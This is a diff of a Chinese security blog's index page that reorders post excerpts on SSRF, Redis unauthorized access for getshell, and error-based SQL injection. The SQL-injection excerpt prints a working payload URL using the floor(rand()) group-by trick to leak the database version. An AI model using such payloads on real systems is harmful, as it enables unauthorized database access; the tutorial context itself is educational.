@@ -340,7 +340,7 @@ SSRF(Server-side Request Forge, 服务端请求伪造)
 
 
 漏洞产生由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。
-2.1举个栗
+举个栗子12
           ...
           <!--noindex-->
           <div class="post-button text-center">
@@ -651,136 +651,6 @@ Base64是一种基于64个可打印字符来表示二进制数据的表示方法
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/Error-Based-SQL Injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Boi">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="AirBoi">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/04/17/Error-Based-SQL Injection/" itemprop="url">报错注入总结</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-17T10:36:18+08:00">
-                2018-04-17
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <hr>
-<h2 id="1-floor"><a href="#1-floor" class="headerlink" title="1 floor()"></a>1 floor()</h2><hr>
-<p>Example</p>
-<p>Show Version()</p>
-<pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&pass=1</code></pre>
-Show Databases
----
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2018/04/17/Error-Based-SQL Injection/#more" rel="contents">
-              Read more &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/Redis未授权访问漏洞与SSH配合getshell/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -861,6 +731,136 @@ Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存
           <!--noindex-->
           <div class="post-button text-center">
             <a class="btn" href="/2018/04/17/Redis未授权访问漏洞与SSH配合getshell/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/04/17/Error-Based-SQL Injection/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Boi">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="AirBoi">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/04/17/Error-Based-SQL Injection/" itemprop="url">报错注入总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-04-17T10:36:18+08:00">
+                2018-04-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <hr>
+<h2 id="1-floor"><a href="#1-floor" class="headerlink" title="1 floor()"></a>1 floor()</h2><hr>
+<p>Example</p>
+<p>Show Version()</p>
+<pre><code class="SQL">http://0.0.0.0:8001/test.php?name=aa'and (select 1 from  (select count(*),concat(version(),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23&pass=1</code></pre>
+Show Databases
+---
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/17/Error-Based-SQL Injection/#more" rel="contents">
               Read more &raquo;
             </a>
           </div>
